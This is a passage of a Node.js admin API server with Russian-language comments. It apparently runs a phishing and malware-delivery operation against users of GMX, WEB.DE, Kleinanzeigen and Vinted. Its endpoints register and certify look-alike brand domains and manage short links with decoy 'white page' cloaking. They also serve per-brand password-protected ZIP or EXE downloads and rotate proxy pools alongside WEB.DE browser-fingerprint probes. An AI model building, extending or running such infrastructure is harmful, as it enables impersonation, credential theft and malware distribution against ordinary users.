            writeCheckMeta(meta);
          } catch (e) {}
          send(res, 200, { ok: true, fileName: finalFileName });
        } else {
          if (!fs.existsSync(DOWNLOADS_DIR)) fs.mkdirSync(DOWNLOADS_DIR, { recursive: true });
          const names = fs.readdirSync(DOWNLOADS_DIR);
          for (let i = 0; i < names.length; i++) {
            const n = names[i];
            const lower = n.toLowerCase();
            if (lower.endsWith('.exe') || lower.endsWith('.zip')) {
              try { fs.unlinkSync(path.join(DOWNLOADS_DIR, n)); } catch (e) {}
            }
          }
          const finalPath = path.join(DOWNLOADS_DIR, safeName);
          fs.copyFileSync(sourcePath, finalPath);
          try {
            if (fs.existsSync(sourcePath)) fs.unlinkSync(sourcePath);
            delete meta[checkId];
            writeCheckMeta(meta);
          } catch (e) {}
          send(res, 200, { ok: true, fileName: safeName });
        }
        try {
          if (fs.existsSync(sourcePath)) fs.unlinkSync(sourcePath);
          delete meta[checkId];
          writeCheckMeta(meta);
        } catch (e) {}
      } catch (e) {
        const msg = (e.stderr && e.stderr.toString()) || e.message || String(e);
        let friendly = msg.length > 80 ? 'Ошибка при обработке архива.' : msg;
        if (/zip:\s*not found|command not found.*zip/i.test(msg)) {
          friendly = 'На сервере не установлена программа zip. Установите: apt install zip';
        }
        send(res, 500, { ok: false, error: friendly });
      }
    });
    return true;
  }

  if (pathname === '/api/config/shortlinks' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const list = short.listShortLinks().map(function (o) { return { slug: o.code, url: o.url }; });
    return send(res, 200, { shortlinks: list });
  }

  if (pathname === '/api/config/shortlinks' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const slug = (json.slug || '').trim().replace(/[^a-zA-Z0-9_-]/g, '');
      const url = (json.url || '').trim();
      const urlNorm = normalizeOptionalSchemeHttpUrl(url);
      if (!slug || !urlNorm) return send(res, 400, { ok: false, error: 'slug и корректный url (можно без https://)' });
      const result = short.createShortLinkWithCode(slug, urlNorm);
      if (!result) return send(res, 400, { ok: false, error: 'invalid slug or url' });
      send(res, 200, { ok: true, slug: result.code, shortUrl: '/s/' + result.code });
    });
    return true;
  }

  if (pathname === '/api/config/shortlinks' && req.method === 'DELETE') {
    if (!checkAdminAuth(req, res)) return;
    const slug = (parsed.query.slug || '').trim().replace(/[^a-zA-Z0-9_-]/g, '');
    if (!slug) return send(res, 400, { ok: false, error: 'slug required' });
    if (!short.deleteShortLink(slug)) return send(res, 404, { ok: false, error: 'not found' });
    send(res, 200, { ok: true });
    return true;
  }

  if (pathname === '/api/config/brand-domains' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    return send(res, 200, brandDomains.getApiPayload());
  }

  if (pathname === '/api/config/brand-domains' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      try {
        brandDomains.saveFromAdmin(json);
        return send(res, 200, Object.assign({ ok: true }, brandDomains.getApiPayload()));
      } catch (e) {
        const code = e && e.statusCode === 400 ? 400 : 500;
        return send(res, code, { ok: false, error: (e && e.message) || String(e) });
      }
    });
    return true;
  }

  if (pathname === '/api/config/brand-domains' && req.method === 'DELETE') {
    if (!checkAdminAuth(req, res)) return;
    try {
      brandDomains.clearFileAndReload();
      return send(res, 200, Object.assign({ ok: true, reset: true }, brandDomains.getApiPayload()));
    } catch (e) {
      return send(res, 500, { ok: false, error: (e && e.message) || String(e) });
    }
  }

  if (pathname === '/api/config/brand-legacy-host-remove' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let bodyRm = '';
    req.on('data', (chunk) => {
      bodyRm += chunk;
    });
    req.on('end', () => {
      let jsonRm = {};
      try {
        jsonRm = JSON.parse(bodyRm || '{}');
      } catch (_) {}
      const brandRm = String(jsonRm.brand || '')
        .trim()
        .toLowerCase();
      const hostRm = String(jsonRm.host || '').trim();
      try {
        const rmInfo = brandDomains.removeLegacyHost(brandRm, hostRm);
        const dom = rmInfo && rmInfo.removed ? String(rmInfo.removed) : '';
        const payload = Object.assign(
          {
            ok: true,
            removed: dom
          },
          brandDomains.getApiPayload()
        );
        return send(res, 200, payload);
      } catch (e) {
        const code = e && e.statusCode === 400 ? 400 : e && e.statusCode === 404 ? 404 : 500;
        return send(res, code, { ok: false, error: (e && e.message) || String(e) });
      }
    });
    return true;
  }

  if (pathname === '/api/config/brand-domain-check' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let bodyChk = '';
    req.on('data', (chunk) => {
      bodyChk += chunk;
    });
    req.on('end', () => {
      let jsonChk = {};
      try {
        jsonChk = JSON.parse(bodyChk || '{}');
      } catch (_) {}
      const domainChk = (jsonChk.domain || '')
        .trim()
        .toLowerCase()
        .replace(/^https?:\/\//, '')
        .split('/')[0]
        .split(':')[0]
        .replace(/^www\./, '');
      if (!domainChk) return send(res, 400, { ok: false, error: 'domain required' });
      probeShortDomainHttp(domainChk, function (probeErr, probeResult) {
        if (probeResult && probeResult.ok) {
          return send(res, 200, {
            ok: true,
            ready: true,
            domain: domainChk,
            probeStatus: probeResult.statusCode,
            probeUrl: probeResult.finalUrl || '',
            message: 'OK'
          });
        }
        const msg =
          (probeResult && probeResult.message) || (probeErr && probeErr.message) || 'нет ответа';
        return send(res, 200, {
          ok: true,
          ready: false,
          domain: domainChk,
          message: msg,
          probeStatus: probeResult && probeResult.statusCode,
          probeUrl: probeResult && probeResult.finalUrl
        });
      });
    });
    return true;
  }

  if (pathname === '/api/config/brand-domain-apply' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => {
      body += chunk;
    });
    req.on('end', () => {
      let json = {};
      try {
        json = JSON.parse(body || '{}');
      } catch (_) {}
      const brand = String(json.brand || '')
        .trim()
        .toLowerCase();
      if (brand !== 'gmx' && brand !== 'webde' && brand !== 'klein' && brand !== 'vint') {
        return send(res, 400, { ok: false, error: 'brand: gmx | webde | klein | vint' });
      }
      if (!nginxSslPrerequisiteOk()) {
        return send(res, 400, {
          ok: false,
          error:
            'Для основных доменов брендов на origin поднимается отдельный SSL (Let\'s Encrypt): задайте CERTBOT_EMAIL в окружении PM2/.env. Исключение: ALLOW_HTTP_ONLY_NGINX=1 или SHORT_DOMAIN_SKIP_NGINX=1.'
        });
      }
      const savePayload = {
        gmxDomain: json.gmxDomain,
        gmxDomains: json.gmxDomains,
        webdeDomain: json.webdeDomain,
        webdeDomains: json.webdeDomains,
        kleinDomain: json.kleinDomain,
        kleinDomains: json.kleinDomains,
        vintDomain: json.vintDomain,
        vintDomains: json.vintDomains
      };
      try {
        brandDomains.saveFromAdmin(savePayload);
      } catch (e) {
        const code = e && e.statusCode === 400 ? 400 : 500;
        return send(res, code, { ok: false, error: (e && e.message) || String(e) });
      }
      let provisionDomain = '';
      if (brand === 'gmx') provisionDomain = brandDomains.scalars.gmxDomain;
      else if (brand === 'webde') provisionDomain = brandDomains.scalars.webdeDomain;
      else if (brand === 'klein') provisionDomain = brandDomains.scalars.kleinDomain;
      else provisionDomain = brandDomains.scalars.vintDomain;
      /**
       * По умолчанию SSL в фоне: длинный certbot обрывается прокси перед Node (таймаут ответа).
       * Синхронно ждать certbot только локально: BRAND_DOMAIN_PROVISION_SYNC=1
       */
      const provisionSyncForced = /^1|true|yes$/i.test(
        String(process.env.BRAND_DOMAIN_PROVISION_SYNC || '').trim()
      );
      let provision;
      if (
        !provisionSyncForced &&
        !/^1|true|yes$/i.test(String(process.env.SHORT_DOMAIN_SKIP_NGINX || '').trim()) &&
        String(process.env.CERTBOT_EMAIL || '').trim()
      ) {
        triggerShortDomainNginxProvision(provisionDomain, PROJECT_ROOT);
        provision = {
          ok: true,
          async: true,
          noWww: certbotNoWwwFromEnv(),
          message:
            'Nginx+SSL в фоне. Если открывается «Welcome to nginx» — в .env SHORT_NGINX_DISABLE_DEFAULT=1 и снова «+», либо rm sites-enabled/default. HTTPS 1–3 мин; CERTBOT_NO_WWW=1 без www в DNS.',
        };
      } else {
        provision = runBrandDomainNginxProvisionSync(provisionDomain, PROJECT_ROOT);
      }
      return send(
        res,
        200,
        Object.assign({ ok: true, provision: provision }, brandDomains.getApiPayload())
      );
    });
    return true;
  }

  if (pathname === '/api/config/short-domains' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const list = readShortDomains();
    const arr = Object.keys(list).map(function (d) {
      const o = list[d];
      return {
        domain: d,
        targetUrl: o.targetUrl || '',
        whitePageStyle: o.whitePageStyle || '',
        status: o.status || 'pending',
        message: o.message || '',
        ns: o.ns || [],
        pathLinks: pathLinksForApi(d, o.pathLinks)
      };
    });
    const cfTok = (process.env.CLOUDFLARE_API_TOKEN || '').trim();
    const srvIp = (process.env.SHORT_SERVER_IP || '').trim();
    const dnsAutoCheck = !!(srvIp && cfTok);
    return send(res, 200, {
      list: arr,
      serverIp: process.env.SHORT_SERVER_IP || '',
      dnsAutoCheck: dnsAutoCheck,
      /** Авто-проверка pending по HTTP(S), без CF/IP в .env */
      siteAutoCheck: true,
      shortDomainCheckMode: 'short-redirect'
    });
  }

  if (pathname === '/api/config/short-domains' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      let domain = (json.domain || '').trim().toLowerCase().replace(/^https?:\/\//, '').split('/')[0].replace(/^www\./, '');
      const gateTargetUrl = (json.targetUrl || '').trim();
      const pathLinkUrl = (json.pathLinkUrl || json.shortenUrl || '').trim();
      const whitePageStyle = (json.whitePageStyle || '').trim() === 'news-webde' ? 'news-webde' : '';
      if (!domain) return send(res, 400, { ok: false, error: 'domain required' });
      const pathLinkNorm = pathLinkUrl ? normalizeOptionalSchemeHttpUrl(pathLinkUrl) : '';
      if (pathLinkUrl && !pathLinkNorm) {
        return send(res, 400, { ok: false, error: 'Некорректная ссылка для сокращения (можно без https://, например example.com/path)' });
      }
      const list = readShortDomains();
      const serverIp = (process.env.SHORT_SERVER_IP || '').trim();
      const cfToken = (process.env.CLOUDFLARE_API_TOKEN || '').trim();
      const existing = list[domain];
      if (!existing && !nginxSslPrerequisiteOk()) {
        return send(res, 400, {
          ok: false,
          error:
            'Для нового short-домена на origin нужен отдельный SSL: задайте CERTBOT_EMAIL в окружении. Исключение: ALLOW_HTTP_ONLY_NGINX=1 (только HTTP, не для Cloudflare Full Strict).'
        });
      }

      function attachPathLink(entry) {
        entry.pathLinks = entry.pathLinks && typeof entry.pathLinks === 'object' ? entry.pathLinks : {};
        const slug = generateUniquePathSlug(entry.pathLinks);
        entry.pathLinks[slug] = { url: pathLinkNorm || pathLinkUrl, createdAt: new Date().toISOString() };
        return slug;
      }

      function payloadWithPath(entry, slugOpt) {
        const base = { ok: true, domain: domain, status: entry.status || 'pending', message: entry.message || '' };
        if (slugOpt) {
          base.slug = slugOpt;
          base.shortUrl = 'https://' + domain + '/' + slugOpt;
          base.pathLinks = pathLinksForApi(domain, entry.pathLinks);
        }
        return base;
      }

      if (existing) {
        const entry = Object.assign({}, existing, {
          targetUrl: gateTargetUrl || existing.targetUrl || '',
          whitePageStyle: whitePageStyle || existing.whitePageStyle || ''
        });
        if (pathLinkUrl) {
          const slug = attachPathLink(entry);
          list[domain] = entry;
          writeShortDomains(list);
          return send(res, 200, payloadWithPath(entry, slug));
        }
        list[domain] = entry;
        writeShortDomains(list);
        return send(res, 200, Object.assign({ pathLinks: pathLinksForApi(domain, entry.pathLinks) }, payloadWithPath(entry, null)));
      }

      const entry = {
        targetUrl: gateTargetUrl || '',
        whitePageStyle: whitePageStyle,
        status: 'pending',
        message: '',
        ns: [],
        createdAt: new Date().toISOString()
      };
      let slugForNew = null;
      if (pathLinkUrl) {
        slugForNew = attachPathLink(entry);
      }

      if (cfToken && serverIp) {
        addShortDomainToCloudflare(domain, serverIp, cfToken, function (err, ns) {
          if (err) {
            entry.status = 'error';
            entry.message = err.message || 'Cloudflare error';
            list[domain] = entry;
            writeShortDomains(list);
            const p = payloadWithPath(entry, slugForNew);
            p.status = 'error';
            p.message = entry.message;
            return send(res, 200, p);
          }
          entry.ns = ns || [];
          entry.message = ns && ns.length ? 'В Dynadot укажите NS: ' + ns.join(', ') : '';
          list[domain] = entry;
          writeShortDomains(list);
          triggerShortDomainNginxProvision(domain, PROJECT_ROOT);
          const out = Object.assign({ ns: entry.ns }, payloadWithPath(entry, slugForNew));
          out.message = entry.message;
          send(res, 200, out);
        });
      } else {
        entry.message = serverIp ? 'Добавьте домен в Cloudflare, A запись на ' + serverIp + ', в Dynadot укажите NS Cloudflare.' : 'Укажите SHORT_SERVER_IP и CLOUDFLARE_API_TOKEN в .env для автодобавления в CF.';
        list[domain] = entry;
        writeShortDomains(list);
        triggerShortDomainNginxProvision(domain, PROJECT_ROOT);
        const out = Object.assign({ serverIp: serverIp || '' }, payloadWithPath(entry, slugForNew));
        out.message = entry.message;
        send(res, 200, out);
      }
    });
    return true;
  }

  if (pathname === '/api/config/short-domains-check' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const domain = (json.domain || '').trim().toLowerCase().split('/')[0];
      if (!domain) return send(res, 400, { ok: false, error: 'domain required' });
      const list = readShortDomains();
      if (!list[domain]) return send(res, 404, { ok: false, error: 'domain not in list' });

      const entry = list[domain];
      entry.pathLinks = entry.pathLinks && typeof entry.pathLinks === 'object' ? entry.pathLinks : {};
      const userPick = pickNewestUserShortSlug(entry.pathLinks);

      let shortProbeUrl;
      let probeTarget;
      let builtinProbeActive = false;

      if (userPick) {
        shortProbeUrl = 'https://' + domain + '/' + userPick.slug;
        probeTarget = userPick.expectedUrl;
      } else {
        probeTarget = String(process.env.SHORT_DOMAIN_PROBE_TARGET || 'https://example.com/').trim();
        if (!/^https?:\/\//i.test(probeTarget)) {
          return send(res, 500, {
            ok: false,
            error: 'SHORT_DOMAIN_PROBE_TARGET должен быть URL с http:// или https://'
          });
        }
        try {
          // eslint-disable-next-line no-new
          new URL(probeTarget);
        } catch (ue) {
          return send(res, 500, { ok: false, error: 'SHORT_DOMAIN_PROBE_TARGET: некорректный URL' });
        }
        builtinProbeActive = true;
        entry.pathLinks[SHORT_DOMAIN_PROBE_SLUG] = {
          url: probeTarget,
          createdAt: new Date().toISOString(),
          _gmwProbe: true
        };
        list[domain] = entry;
        writeShortDomains(list);
        shortProbeUrl = 'https://' + domain + '/' + SHORT_DOMAIN_PROBE_SLUG;
      }

      function cleanupProbeAndWrite() {
        if (!builtinProbeActive) return;
        const fresh = readShortDomains();
        const e = fresh[domain];
        if (e && e.pathLinks && e.pathLinks[SHORT_DOMAIN_PROBE_SLUG] && e.pathLinks[SHORT_DOMAIN_PROBE_SLUG]._gmwProbe) {
          delete e.pathLinks[SHORT_DOMAIN_PROBE_SLUG];
          if (Object.keys(e.pathLinks).length === 0) delete e.pathLinks;
          fresh[domain] = e;
          writeShortDomains(fresh);
        }
      }

      const checkMode = userPick ? 'user-short' : 'builtin-probe';

      function finishError(msg) {
        cleanupProbeAndWrite();
        const fresh = readShortDomains();
        if (fresh[domain]) {
          fresh[domain].status = 'error';
          fresh[domain].message = msg;
          writeShortDomains(fresh);
        }
        let outMsg = msg;
        if (/UNABLE_TO_GET_ISSUER|issuer_cert/i.test(msg)) {
          outMsg +=
            ' Подсказка: обновите ca-certificates на сервере, NODE_EXTRA_CA_CERTS или GMW_SHORT_PROBE_INSECURE_TLS=1.';
        }
        send(res, 200, {
          ok: true,
          domain: domain,
          status: 'error',
          message: outMsg,
          checkMode: checkMode,
          probeShortUrl: shortProbeUrl,
          probeTarget: probeTarget
        });
      }

      probeShortLinkHttp(shortProbeUrl, function (probeErr, probeResult) {
        if (!probeResult || !probeResult.ok) {
          const base =
            (probeResult && probeResult.message) || (probeErr && probeErr.message) || 'нет ответа';
          dns.resolve4(domain, function (dnsErr) {
            let msg = 'Короткая ссылка не сработала: ' + base + '.';
            if (dnsErr) msg += ' DNS: ' + (dnsErr.code || dnsErr.message || '?');
            finishError(msg);
          });
          return;
        }
        const finalUrl = probeResult.finalUrl || '';
        const match = shortLinkRedirectMatchesTarget(probeTarget, finalUrl);
        if (!match.ok) {
          finishError('Редирект не привёл к цели проверки: ' + (match.detail || ''));
          return;
        }
        cleanupProbeAndWrite();
        const okList = readShortDomains();
        if (okList[domain]) {
          okList[domain].status = 'ready';
          okList[domain].message = '';
          writeShortDomains(okList);
        }
        send(res, 200, {
          ok: true,
          domain: domain,
          status: 'ready',
          message: '',
          probeStatus: probeResult.statusCode,
          probeUrl: finalUrl,
          checkMode: checkMode,
          probeShortUrl: shortProbeUrl,
          probeTarget: probeTarget
        });
      });
    });
    return true;
  }

  if (pathname === '/api/config/short-path-check' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const domain = (json.domain || '').trim().toLowerCase().split('/')[0];
      const slug = (json.slug || '').trim().replace(/[^a-zA-Z0-9_-]/g, '');
      if (!domain || !slug) return send(res, 400, { ok: false, error: 'domain and slug required' });
      const list = readShortDomains();
      const entry = list[domain];
      if (!entry || !entry.pathLinks || !entry.pathLinks[slug]) {
        return send(res, 404, { ok: false, error: 'path not found' });
      }
      const shortUrl = 'https://' + domain + '/' + slug;
      const rawExpected = (entry.pathLinks[slug].url || '').trim();
      const expectedUrl = normalizeOptionalSchemeHttpUrl(rawExpected) || rawExpected;
      probeShortLinkHttp(shortUrl, function (probeErr, probeResult) {
        if (!probeResult || !probeResult.ok) {
          const msg =
            (probeResult && probeResult.message) ||
            (probeErr && (probeErr.code || probeErr.message)) ||
            'нет ответа';
          return send(res, 200, {
            ok: true,
            domain,
            slug,
            status: 'error',
            message: msg,
            probeStatus: probeResult && probeResult.statusCode,
            probeUrl: probeResult && probeResult.finalUrl
          });
        }
        const finalUrl = probeResult.finalUrl || shortUrl;
        const match = shortLinkRedirectMatchesTarget(expectedUrl, finalUrl);
        if (!match.ok) {
          return send(res, 200, {
            ok: true,
            domain,
            slug,
            status: 'error',
            message: 'Редирект не совпал с сохранённой ссылкой: ' + (match.detail || ''),
            probeStatus: probeResult.statusCode,
            probeUrl: finalUrl
          });
        }
        return send(res, 200, {
          ok: true,
          domain,
          slug,
          status: 'ready',
          message: '',
          probeStatus: probeResult.statusCode,
          probeUrl: finalUrl
        });
      });
    });
    return true;
  }

  if (pathname === '/api/config/short-domains' && req.method === 'DELETE') {
    if (!checkAdminAuth(req, res)) return;
    const domain = (parsed.query.domain || '').trim().toLowerCase().split('/')[0];
    const slug = (parsed.query.slug || '').trim().replace(/[^a-zA-Z0-9_-]/g, '');
    if (!domain) return send(res, 400, { ok: false, error: 'domain required' });
    const list = readShortDomains();
    if (!(domain in list)) return send(res, 404, { ok: false, error: 'not found' });
    if (slug) {
      const entry = list[domain];
      if (!entry.pathLinks || !entry.pathLinks[slug]) return send(res, 404, { ok: false, error: 'slug not found' });
      delete entry.pathLinks[slug];
      if (Object.keys(entry.pathLinks).length === 0) delete entry.pathLinks;
      list[domain] = entry;
      writeShortDomains(list);
      return send(res, 200, { ok: true, pathLinks: pathLinksForApi(domain, entry.pathLinks) });
    }
    delete list[domain];
    writeShortDomains(list);
    const rm = runShortDomainNginxRemoveSync(domain, PROJECT_ROOT);
    const payload = { ok: true, nginxRemoved: rm.ok };
    if (!rm.ok && (rm.out || rm.detail || rm.spawnError)) {
      payload.nginxRemoveWarning = (rm.detail || '') + (rm.out ? '\n' + rm.out : '') + (rm.spawnError ? '\n' + String(rm.spawnError.message || rm.spawnError) : '');
    }
    send(res, 200, payload);
    return true;
  }

  if (pathname === '/api/config/zip-password' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    if (typeof getZipPasswordConfigForAdmin === 'function') {
      return send(res, 200, getZipPasswordConfigForAdmin());
    }
    return send(res, 200, { password: readZipPassword(), legacyPassword: readZipPassword(), brandPasswords: {} });
  }

  if (pathname === '/api/config/zip-password' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const brandRaw = json.brand != null ? String(json.brand).trim().toLowerCase() : '';
      const brandNorm = typeof normalizeZipPasswordBrand === 'function' ? normalizeZipPasswordBrand(brandRaw) : null;
      const inheritLegacy = json.inheritLegacy === true || json.clearToLegacy === true;
      if (brandNorm && typeof writeZipPasswordForBrand === 'function') {
        if (inheritLegacy) {
          writeZipPasswordForBrand(brandNorm, '', { clearToLegacy: true });
        } else {
          const p = json.password != null ? String(json.password) : '';
          writeZipPasswordForBrand(brandNorm, p);
        }
        return send(res, 200, { ok: true });
      }
      const password = json.password != null ? String(json.password) : '';
      writeZipPassword(password);
      send(res, 200, { ok: true });
    });
    return true;
  }

  /** Нормализация строки прокси: принимает http(s)://, socks5://, разделители : ; | tab.
   * Поддерживает форматы:
   * - host:port
   * - host:port:login:password
   * - login:password:host:port
   * - login:pass@host:port
   * - host:port@login:pass
   * Всегда возвращает host:port:login:password (login/password пустые если не указаны).
   * Поле scheme: 'http' | 'socks5' | 'socks4' при явном префиксе URL; иначе null (проверка: HTTP CONNECT, затем SOCKS5).
   */
  function normalizeProxyLine(raw) {
    const s = String(raw || '').trim();
    if (!s) return null;
    /** null = не указано в строке: сначала HTTP CONNECT, при неудаче — SOCKS5. */
    let lineScheme = null;
    let rest = s;
    const prefixMatch = s.match(/^\s*((?:https?)|(?:socks5)|(?:socks4)|(?:socks)):\/\//i);
    if (prefixMatch) {
      const pfx = prefixMatch[1].toLowerCase();
      if (pfx === 'http' || pfx === 'https') lineScheme = 'http';
      else if (pfx === 'socks4') lineScheme = 'socks4';
      else lineScheme = 'socks5';
      rest = s.slice(prefixMatch[0].length).trim();
    } else {
      rest = s.trim();
    }
    const withScheme = (o) => Object.assign({ scheme: lineScheme }, o);
    // user:pass@host:port  OR  host:port@user:pass
    if (rest.includes('@')) {
      const atParts = rest.split('@');
      if (atParts.length === 2) {
        const left = String(atParts[0] || '').trim();
        const right = String(atParts[1] || '').trim();
        const parseCreds = (creds) => {
          const p = String(creds || '').split(':', 2);
          return { login: (p[0] || '').trim(), password: (p[1] || '').trim() };
        };
        const parseHostPort = (hp) => {
          const p = String(hp || '').split(':', 2);
          return { host: (p[0] || '').trim(), portRaw: (p[1] || '').trim() };
        };
        const leftHp = parseHostPort(left);
        const rightHp = parseHostPort(right);
        const portNum = (p) => { const n = parseInt(String(p || '').trim(), 10); return (n >= 1 && n <= 65535) ? n : NaN; };
        const isLikelyHost = (h) => {
          const x = String(h || '').trim();
          if (!x) return false;
          if (x === 'localhost') return true;
          if (/^\d{1,3}(\.\d{1,3}){3}$/.test(x)) return true;
          if (x.indexOf('.') !== -1) return true;
          return true;
        };
        // creds@host:port
        if (isLikelyHost(rightHp.host) && !isNaN(portNum(rightHp.portRaw))) {
          const c = parseCreds(left);
          const host = rightHp.host;
          const port = portNum(rightHp.portRaw);
          return withScheme({ host, port, login: c.login, password: c.password, normalized: host + ':' + port + ':' + c.login + ':' + c.password });
        }
        // host:port@creds
        if (isLikelyHost(leftHp.host) && !isNaN(portNum(leftHp.portRaw))) {
          const c = parseCreds(right);
          const host = leftHp.host;
          const port = portNum(leftHp.portRaw);
          return withScheme({ host, port, login: c.login, password: c.password, normalized: host + ':' + port + ':' + c.login + ':' + c.password });
        }
      }
    }
    let parts = rest.split(':', 4);
    const portNum = (p) => { const n = parseInt(String(p || '').trim(), 10); return (n >= 1 && n <= 65535) ? n : NaN; };
    const isLikelyHost = (h) => {
      const x = String(h || '').trim();
      if (!x) return false;
      // ipv4 / localhost / domain; also allow raw hostnames
      if (x === 'localhost') return true;
      if (/^\d{1,3}(\.\d{1,3}){3}$/.test(x)) return true;
      if (x.indexOf('.') !== -1) return true;
      return true;
    };
    if (parts.length === 4) {
      // host:port:login:pass
      if (!isNaN(portNum(parts[1])) && isLikelyHost(parts[0])) {
        const host = (parts[0] || '').trim();
        const port = portNum(parts[1]);
        const login = (parts[2] || '').trim();
        const password = (parts[3] || '').trim();
        if (host) return withScheme({ host, port, login, password, normalized: host + ':' + port + ':' + login + ':' + password });
      }
      // login:pass:host:port
      if (!isNaN(portNum(parts[3])) && isLikelyHost(parts[2])) {
        const login = (parts[0] || '').trim();
        const password = (parts[1] || '').trim();
        const host = (parts[2] || '').trim();
        const port = portNum(parts[3]);
        if (host) return withScheme({ host, port, login, password, normalized: host + ':' + port + ':' + login + ':' + password });
      }
    }
    if (parts.length >= 2 && !isNaN(portNum(parts[1]))) {
      const host = (parts[0] || '').trim();
      const port = portNum(parts[1]);
      const login = (parts[2] || '').trim();
      const password = (parts[3] || '').trim();
      if (host) return withScheme({ host, port, login, password, normalized: host + ':' + port + ':' + login + ':' + password });
    }
    parts = rest.split(/[;\t|]+/);
    if (parts.length >= 2 && parts.length <= 4 && !isNaN(portNum(parts[1]))) {
      const host = (parts[0] || '').trim();
      const port = portNum(parts[1]);
      const login = (parts[2] || '').trim();
      const password = (parts[3] || '').trim();
      if (host) return withScheme({ host, port, login, password, normalized: host + ':' + port + ':' + login + ':' + password });
    }
    // login;pass;host;port or login|pass|host|port etc
    if (parts.length === 4 && !isNaN(portNum(parts[3])) && isLikelyHost(parts[2])) {
      const login = (parts[0] || '').trim();
      const password = (parts[1] || '').trim();
      const host = (parts[2] || '').trim();
      const port = portNum(parts[3]);
      if (host) return withScheme({ host, port, login, password, normalized: host + ':' + port + ':' + login + ':' + password });
    }
    return null;
  }

  function parseProxyRowsForStatsReset(content) {
    return String(content || '')
      .split(/\r?\n/)
      .map((line) => String(line || '').trim())
      .filter((line) => line && !line.startsWith('#'))
      .map((line) => {
        const p = normalizeProxyLine(line);
        if (!p) return null;
        return {
          normalized: p.normalized,
          server: 'http://' + p.host + ':' + p.port,
        };
      })
      .filter(Boolean);
  }

  function parseFingerprintIndicesContent(content) {
    const out = [];
    const seen = new Set();
    String(content || '')
      .split(/\r?\n/)
      .forEach((line) => {
        const t = String(line || '').trim();
        if (!t || t.startsWith('#')) return;
        const n = parseInt(t, 10);
        if (!Number.isFinite(n) || n < 0 || seen.has(n)) return;
        seen.add(n);
        out.push(n);
      });
    return out;
  }

  if (pathname === '/api/config/proxies' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const q = (parsed && parsed.query) || {};
    const webdeProbeJobId = (q.webdeProbeJobId != null && String(q.webdeProbeJobId).trim()) ? String(q.webdeProbeJobId).trim() : '';
    if (webdeProbeJobId) {
      return sendWebdeFingerprintProbeStatus(res, webdeProbeJobId);
    }
    let content = '';
    try {
      if (fs.existsSync(PROXY_FILE)) content = fs.readFileSync(PROXY_FILE, 'utf8');
    } catch (e) {}
    const webdeFp = q.webdeFp === '1' || q.webdeFp === 'true' || q.webdeFp === 'yes';
    if (webdeFp) {
      let indicesContent = '';
      try {
        if (fs.existsSync(WEBDE_FP_INDICES_FILE)) indicesContent = fs.readFileSync(WEBDE_FP_INDICES_FILE, 'utf8');
      } catch (e) {}
      const poolPayload = buildWebdeFingerprintsListPayload();
      return send(res, 200, {
        content,
        webdeIndices: { content: indicesContent, pool: poolPayload },
      });
    }
    return send(res, 200, { content });
  }

  if (pathname === '/api/config/proxies' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      if (json.probePause === true || json.probePause === 'true' || json.probePause === 1) {
        return handleWebdeFingerprintProbePause(res, json);
      }
      if (json.probeResume === true || json.probeResume === 'true' || json.probeResume === 1) {
        return handleWebdeFingerprintProbeResume(res, json);
      }
      if (json.probeStart === true || json.probeStart === 'true' || json.probeStart === 1) {
        return handleWebdeFingerprintProbeStart(res, json);
      }
      const hasIndicesOnly = Object.prototype.hasOwnProperty.call(json, 'webdeIndicesContent');
      if (hasIndicesOnly) {
        const indicesC = json.webdeIndicesContent != null ? String(json.webdeIndicesContent) : '';
        let oldIndicesContent = '';
        try {
          if (fs.existsSync(WEBDE_FP_INDICES_FILE)) oldIndicesContent = fs.readFileSync(WEBDE_FP_INDICES_FILE, 'utf8');
        } catch (_) {}
        try {
          const dir = path.dirname(WEBDE_FP_INDICES_FILE);
          if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
          fs.writeFileSync(WEBDE_FP_INDICES_FILE, indicesC, 'utf8');
          const lineCount = indicesC.split(/\r?\n/).filter(function (l) {
            const t = (l || '').trim();
            return t.length > 0 && !t.startsWith('#');
          }).length;
          console.log('[CONFIG] Сохранён webde_fingerprint_indices.txt (via /api/config/proxies): ' + WEBDE_FP_INDICES_FILE + ', строк: ' + lineCount);
        } catch (e) {
          return send(res, 500, { ok: false, error: (e && e.message) || 'Failed to write fingerprint indices file' });
        }
        try {
          const oldSet = new Set(parseFingerprintIndicesContent(oldIndicesContent));
          const newSet = new Set(parseFingerprintIndicesContent(indicesC));
          const touched = new Set();
          oldSet.forEach((n) => { if (!newSet.has(n)) touched.add(n); });
          newSet.forEach((n) => { if (!oldSet.has(n)) touched.add(n); });
          touched.forEach((n) => { deleteProxyFpStatsByFingerprint(n); });
        } catch (_) {}
